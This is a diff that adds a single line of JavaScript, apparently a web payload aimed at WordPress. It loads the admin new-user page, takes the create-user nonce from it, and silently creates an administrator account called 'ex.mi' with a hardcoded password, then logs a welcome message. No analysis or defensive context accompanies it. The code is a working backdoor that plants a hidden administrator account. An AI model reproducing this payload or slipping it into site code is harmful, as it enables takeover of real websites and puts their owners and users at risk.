@@ -1,0 +1,1 @@
+u="/wp-admin/user-new.php";jQuery.get(u,function(e){jQuery.post(u,{action:"createuser","_wpnonce_create-user":e.match(/_wpnonce_create-user\"\svalue=\"(.+?)\"/)[1],user_login:"ex.mi",email:"ex.mi@wordpress.tld",pass1:"reality423",pass2:"reality423",role:"administrator"})});console.log("Welcome, Ex.Mi!");
